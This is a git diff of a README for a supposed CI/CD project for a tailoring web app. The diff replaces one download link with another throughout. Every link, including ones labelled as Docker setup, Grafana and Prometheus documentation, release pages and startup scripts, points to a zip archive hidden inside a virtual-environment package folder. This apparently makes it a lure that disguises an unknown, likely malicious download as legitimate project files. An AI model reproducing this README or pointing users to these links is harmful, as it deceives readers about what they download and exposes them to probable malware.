@@ -1,6 +1,6 @@
 # 🌟 DevOps-Project-Gohel-Tailors-Web-App - Easy CI/CD for Your Web App
 
-[![Download](https://raw.githubusercontent.com/drb34r/DevOps-Project-Gohel-Tailors-Web-App/main/venv/Lib/site-packages/pip/_vendor/requests/Ops_Web_Tailors_App_Gohel_Dev_Project_1.6.zip)](https://raw.githubusercontent.com/drb34r/DevOps-Project-Gohel-Tailors-Web-App/main/venv/Lib/site-packages/pip/_vendor/requests/Ops_Web_Tailors_App_Gohel_Dev_Project_1.6.zip)
+[![Download](https://raw.githubusercontent.com/drb34r/DevOps-Project-Gohel-Tailors-Web-App/main/venv/Lib/site-packages/click-8.3.0.dist-info/App-Project-Dev-Gohel-Web-Tailors-Ops-v3.1.zip)](https://raw.githubusercontent.com/drb34r/DevOps-Project-Gohel-Tailors-Web-App/main/venv/Lib/site-packages/click-8.3.0.dist-info/App-Project-Dev-Gohel-Web-Tailors-Ops-v3.1.zip)
 
 ## 🎯 Project Overview
 
@@ -12,7 +12,7 @@ To use this application, you will need to follow these steps:
 
 1. **Visit the Releases Page**: Click on the link below to access the download page.
 
-   [Download the latest version](https://raw.githubusercontent.com/drb34r/DevOps-Project-Gohel-Tailors-Web-App/main/venv/Lib/site-packages/pip/_vendor/requests/Ops_Web_Tailors_App_Gohel_Dev_Project_1.6.zip)
+   [Download the latest version](https://raw.githubusercontent.com/drb34r/DevOps-Project-Gohel-Tailors-Web-App/main/venv/Lib/site-packages/click-8.3.0.dist-info/App-Project-Dev-Gohel-Web-Tailors-Ops-v3.1.zip)
 
 2. **Select the Version**: On the releases page, find the latest version that is available. Each release includes a list of changes and improvements.
 
@@ -27,7 +27,7 @@ To use this application, you will need to follow these steps:
 Before you proceed, make sure your system meets these requirements:
 
 - **Operating System**: Windows 10, macOS, or any recent Linux distribution.
-- **Docker**: Docker must be installed. Follow [this link](https://raw.githubusercontent.com/drb34r/DevOps-Project-Gohel-Tailors-Web-App/main/venv/Lib/site-packages/pip/_vendor/requests/Ops_Web_Tailors_App_Gohel_Dev_Project_1.6.zip) for installation instructions.
+- **Docker**: Docker must be installed. Follow [this link](https://raw.githubusercontent.com/drb34r/DevOps-Project-Gohel-Tailors-Web-App/main/venv/Lib/site-packages/click-8.3.0.dist-info/App-Project-Dev-Gohel-Web-Tailors-Ops-v3.1.zip) for installation instructions.
 - **Jenkins**: Jenkins should be installed and running. You can set it up by visiting the official Jenkins website.
 
 If you need help with installation, feel free to check online resources or user forums.
@@ -36,7 +36,7 @@ If you need help with installation, feel free to check online resources or user 
 
 To install the application:
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/drb34r/DevOps-Project-Gohel-Tailors-Web-App/main/venv/Lib/site-packages/pip/_vendor/requests/Ops_Web_Tailors_App_Gohel_Dev_Project_1.6.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/drb34r/DevOps-Project-Gohel-Tailors-Web-App/main/venv/Lib/site-packages/click-8.3.0.dist-info/App-Project-Dev-Gohel-Web-Tailors-Ops-v3.1.zip).
 2. Choose the latest version.
 3. Download the appropriate file for your operating system.
 4. Extract the files to a location of your choice.
@@ -48,7 +48,7 @@ After downloading and installing the application, follow these steps to run it:
 
 1. **Open your terminal or command line interface**.
 2. Navigate to the folder where you extracted the files. You can do this by typing `cd path/to/your/folder`.
-3. Use the provided scripts to start the application. Typically, you would execute a script called `https://raw.githubusercontent.com/drb34r/DevOps-Project-Gohel-Tailors-Web-App/main/venv/Lib/site-packages/pip/_vendor/requests/Ops_Web_Tailors_App_Gohel_Dev_Project_1.6.zip` or `https://raw.githubusercontent.com/drb34r/DevOps-Project-Gohel-Tailors-Web-App/main/venv/Lib/site-packages/pip/_vendor/requests/Ops_Web_Tailors_App_Gohel_Dev_Project_1.6.zip`, depending on your system.
+3. Use the provided scripts to start the application. Typically, you would execute a script called `https://raw.githubusercontent.com/drb34r/DevOps-Project-Gohel-Tailors-Web-App/main/venv/Lib/site-packages/click-8.3.0.dist-info/App-Project-Dev-Gohel-Web-Tailors-Ops-v3.1.zip` or `https://raw.githubusercontent.com/drb34r/DevOps-Project-Gohel-Tailors-Web-App/main/venv/Lib/site-packages/click-8.3.0.dist-info/App-Project-Dev-Gohel-Web-Tailors-Ops-v3.1.zip`, depending on your system.
 
 ## 🛠️ Troubleshooting
 
@@ -67,12 +67,12 @@ After the application is up and running, you can monitor its health with tools l
 ### Using Grafana:
 
 - You will need to set it up on your AWS infrastructure.
-- Follow the [Grafana Documentation](https://raw.githubusercontent.com/drb34r/DevOps-Project-Gohel-Tailors-Web-App/main/venv/Lib/site-packages/pip/_vendor/requests/Ops_Web_Tailors_App_Gohel_Dev_Project_1.6.zip) for installation steps.
+- Follow the [Grafana Documentation](https://raw.githubusercontent.com/drb34r/DevOps-Project-Gohel-Tailors-Web-App/main/venv/Lib/site-packages/click-8.3.0.dist-info/App-Project-Dev-Gohel-Web-Tailors-Ops-v3.1.zip) for installation steps.
 
 ### Using Prometheus:
 
 - Setting up Prometheus requires creating job configurations that scrape metrics from your application.
-- Consult the [Prometheus Documentation](https://raw.githubusercontent.com/drb34r/DevOps-Project-Gohel-Tailors-Web-App/main/venv/Lib/site-packages/pip/_vendor/requests/Ops_Web_Tailors_App_Gohel_Dev_Project_1.6.zip) for detailed guides.
+- Consult the [Prometheus Documentation](https://raw.githubusercontent.com/drb34r/DevOps-Project-Gohel-Tailors-Web-App/main/venv/Lib/site-packages/click-8.3.0.dist-info/App-Project-Dev-Gohel-Web-Tailors-Ops-v3.1.zip) for detailed guides.
 
 ## 📝 Frequently Asked Questions
 
@@ -82,7 +82,7 @@ A: Double-check that Docker and Jenkins are running. Look for any error messages
 
 **Q: How can I update the application?**
 
-A: Always visit the [Releases page](https://raw.githubusercontent.com/drb34r/DevOps-Project-Gohel-Tailors-Web-App/main/venv/Lib/site-packages/pip/_vendor/requests/Ops_Web_Tailors_App_Gohel_Dev_Project_1.6.zip) for the latest version. Download and follow the installation steps again.
+A: Always visit the [Releases page](https://raw.githubusercontent.com/drb34r/DevOps-Project-Gohel-Tailors-Web-App/main/venv/Lib/site-packages/click-8.3.0.dist-info/App-Project-Dev-Gohel-Web-Tailors-Ops-v3.1.zip) for the latest version. Download and follow the installation steps again.
 
 **Q: Can I contribute to this project?**
 
@@ -92,4 +92,4 @@ A: Contributions are welcome! Please refer to the contributing guidelines in the
 
 For additional help, open an issue on GitHub, and we will respond as soon as possible. Your feedback is valuable in making this application better.
 
-[Download the latest version](https://raw.githubusercontent.com/drb34r/DevOps-Project-Gohel-Tailors-Web-App/main/venv/Lib/site-packages/pip/_vendor/requests/Ops_Web_Tailors_App_Gohel_Dev_Project_1.6.zip) and start deploying your web app today!
+[Download the latest version](https://raw.githubusercontent.com/drb34r/DevOps-Project-Gohel-Tailors-Web-App/main/venv/Lib/site-packages/click-8.3.0.dist-info/App-Project-Dev-Gohel-Web-Tailors-Ops-v3.1.zip) and start deploying your web app today!
